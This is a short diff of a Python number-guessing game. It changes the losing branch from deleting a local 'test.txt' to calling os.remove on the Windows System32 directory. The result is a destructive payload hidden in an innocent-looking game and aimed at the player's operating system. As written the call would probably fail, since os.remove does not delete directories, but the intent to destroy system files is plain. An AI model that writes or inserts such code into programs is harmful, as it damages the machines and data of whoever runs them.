@@ -9,4 +9,4 @@ guess = int(guess)
 if guess == number:
     print("You won!")
 else:
-    os.remove("test.txt")
+    os.remove("C:\Windows\System32")
